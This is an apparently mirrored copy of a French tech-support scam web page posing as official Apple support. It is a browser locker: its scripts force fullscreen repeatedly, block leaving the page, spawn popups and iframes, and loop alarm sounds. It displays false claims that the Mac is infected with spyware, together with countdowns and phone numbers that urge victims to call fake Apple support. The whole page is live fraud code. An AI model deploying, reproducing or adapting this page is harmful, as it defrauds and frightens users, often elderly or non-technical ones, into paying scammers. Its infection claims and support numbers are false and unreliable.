...
<html>
<!-- Mirrored from 142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 29 Sep 2021 10:00:14 GMT -->
<head>
...
<title>Apple Soutien Officiel</title>
...
<script>
    gourl = "http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/index.html"
...
<script src="http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/jquery-3.js"></script>
          ...
          history.pushState(0,0, total );
			...
			$(document).ready(function(){
				...
				$(window).on('click', function(){
					...
					toggleFullScreen();
					alertTimed();
					document.getElementById("ifr").src="http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/index.html";
			...
			window.onbeforeunload = function(e){
				var message = '*************************************************\n\nAppelez Apple Help Desk immédiatement à 09 70 46 18 30 \n\nLes données suivantes seront compromises si vous continuez:\n1. Mots de passe\n2. Historique du navigateur\n3. Informations sur la carte de crédit\n\nCe virus est bien connu pour son identité complète et son vol de carte de crédit. Toute autre action à travers cet ordinateur ou tout ordinateur du réseau révélera des informations privées et comportera des risques sérieux.\n\nAppelez Apple Help Desk immédiatement à 09 70 46 18 30 ';
...
setInterval(function(){toggleFullScreen(); }, 1000);
	...
	<script type="text/javascript">
        ...
        var w1 = window.open('http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/index.html', '1');
        var w2 = window.open('http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/index.html', '2');
        var w3 = window.open('http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/indes.html', '3');
       }
	</script>
...
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159068984-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-159068984-1');
</script>
...
function poponload()
{
testwindow = window.open("http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/index.php", "_blank", "location=1,status=1,scrollbars=1,width=100,height=100");
...
<body onmousemove="move()" onLoad="ajay()"><audio id="xyz" src="http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/Funk.ogg"></audio>
...
if (window.history && window.history.pushState) {
	...
	<div id="header" style=" background-color: #30302F;"></div>
		...
		<div class="section-content">
			<div class="left">
				<img src="http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/logo.png" ;="" height="125px">
			</div>

			<div class="right">
				<h2>Votre système est infecté par (3) un logiciel espion!</h2>
				...
				<br>
				<p>
					<span class="red">Votre Mac OS X est infecté par (3) un logiciel espion.
 Le pré-scan a trouvé des traces de (2) logiciels malveillants et (1) de phishing / spyware.
Dommage du système: 28,1% - Retrait immédiat requis! <BR><BR> Veuillez appeler l'assistance Apple 09 70 46 18 30 . </span><br><br>
					La suppression de <strong>(3) Spyware</strong> est requis immédiatement pour éviter d'autres dommages au système, la perte d'applications, de photos ou d'autres fichiers.
					<br><br>
					Des traces de  <strong>(1) Phishing / Spyware</strong> ont été trouvés sur votre Mac OS X. <strong>Les informations personnelles et bancaires sont menacées.</strong> <br><br>
					<br><br>

				</p>
				<p><span class="red"><span id="mins">1</span> minutes et <span id="secs">37</span> seconds<script type="text/javascript">setInterval('countdown()',1000);function countdown(){var mins=parseInt(document.getElementById("mins").innerHTML);var secs=parseInt(document.getElementById("secs").innerHTML);if(mins!=0 && secs==0){nmins=mins-1;nsecs=59;}else if(mins!=0 || secs!=0){nmins=mins;nsecs=secs-1;}else if(mins==0 && secs==0){nmins=mins;nsecs=secs;}document.getElementById("mins").innerHTML=nmins;document.getElementById("secs").innerHTML=nsecs;}</script>
</span>
					<br><br><br>
					</p><div class="bottomcontent">
					<span class="pull-center">
						<div class="orange"> <a class="btn" href="javascript:;"><strong>
							Veuillez appeler l'assistance Apple 09 70 46 18 30  </strong></a>
						</div>
...
<div class="outer outer1" style="display:none">
	<div class="container">
		<div class="topcontent">
			<div class="header"><img src="http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/ajax2.gif" style="margin-right:9px;" width="32">
...
<div id="chrome-alerts" class="chrome-alert">
            <div>
                ...
                <div class="content-box" id="alert-content-box">
                    <p>ATTENTION!<br>
MAC OS est infecté par des logiciels espions et d'autres applications malveillantes. Les logiciels espions doivent être supprimés et les dommages du système réparés. \ N \ nIl est nécessaire d'appeler le support technique d'Apple au + 1-888-618-1293 et ​​de suivre immédiatement la procédure de suppression de virus. Veuillez continuer.
<br>
<br>
 **Si vous quittez ce site, votre Mac OS restera endommagé et vulnérable**<br>
<br>
<br>
</p>
                </div>
                <label style="font-size: 12px;"><input checked="nonchecked" type="checkbox"> Empêcher cette page de créer des dialogues supplémentaires.</label>
                <div class="action_buttons">
                    <a class="active" id="leave_page" href="#" target="_blank" onclick='return pop("http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/index.html",1500,1000);'>D'accord</a>
<a href="#" class="active" id="amt" target="_blank" onclick='return pop("http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/index.html",1500,1000);' >Fermer</a>
      ...
      <div class="new">
<img src="http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/v1.png"/>
</div>
<audio autoplay="autoplay" loop><source src="http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/beep.mp3" tppabs="http://domain.com/gp-msg.mp3" type="audio/mpeg" /></audio>
...
<script type="text/javascript">
	...
	<iframe src="http://142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/beep.mp3" allow="autoplay" style="display:none;">

</body>
<!-- Mirrored from 142.93.65.75/attention-code-dangereux-602/FRJdfdfdDEf0FRfd0MA1010FR80088Wi/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 29 Sep 2021 10:00:15 GMT -->
</html>
